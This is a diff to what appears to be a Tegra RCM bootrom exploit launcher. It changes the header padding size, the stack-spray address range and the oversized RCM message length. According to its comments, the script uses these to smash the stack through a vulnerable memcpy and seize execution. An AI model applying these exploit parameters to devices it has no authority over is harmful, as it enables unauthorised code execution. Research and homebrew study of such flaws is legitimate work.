@@ -35,6 +35,8 @@ import argparse
 import platform
 import binascii
 
+# RCM_HEADER_SIZE = 680
+RCM_HEADER_SIZE = 644
 
 # The address where the RCM payload is placed.
 # This is fixed for most device.
@@ -46,7 +48,7 @@ PAYLOAD_START_ADDR  = 0x4000aE40
 # Specify the range of addresses where we should inject oct
 # payload address.
 STACK_SPRAY_START   = 0x4000eE40
-STACK_SPRAY_END     = 0x40011000
+STACK_SPRAY_END     = 0x4000f000
 
 # notes:
 # GET_CONFIGURATION to the DEVICE triggers memcpy from 0x40003982
@@ -633,13 +635,14 @@ except OSError as e:
 # Use the maximum length accepted by RCM, so we can transmit as much payload as
 # we want; we'll take over before we get to the end.
 # length  = 0x30298
-length  = 0x0001f814
+length  = 0x30000 + RCM_HEADER_SIZE - 0x10
+# length  = 0x0001f814
 payload = length.to_bytes(4, byteorder='little')
 print("Setting rcm msg size to 0x{:08x}".format(length))
 print("RCM payload (len_insecure): {}".format(payload.hex()))
 
-# pad out to 680 so the payload starts at the right address in IRAM
-payload += b'\0' * (680 - len(payload))
+# pad out to RCM_HEADER_SIZE so the payload starts at the right address in IRAM
+payload += b'\0' * (RCM_HEADER_SIZE - len(payload))
 
 # Populate from [RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
 # We'll use this data to smash the stack when we execute the vulnerable memcpy.
